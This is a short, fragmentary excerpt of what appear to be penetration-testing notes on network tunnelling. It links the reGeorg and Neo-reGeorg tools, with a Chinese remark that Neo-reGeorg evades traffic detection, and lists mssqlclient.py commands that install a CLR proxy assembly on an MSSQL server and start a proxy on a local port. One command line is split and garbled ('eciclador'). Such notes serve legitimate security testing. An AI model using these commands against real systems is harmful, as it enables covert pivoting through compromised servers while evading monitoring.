...
> GitHub: [reGeorg](https://github.com/sensepost/reGeorg)
[Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg)(过流量检测)
...
SQL> exit
python mssqlclient.py username@ip -windows-auth -install 
-clr Microsoft.SqlServer.Proxy.dll
python mssqlclient.py username@ip -windows-auth -start -r
eciclador 'C:\Windows\temp\reciclador.dll' -local-port 1377
```
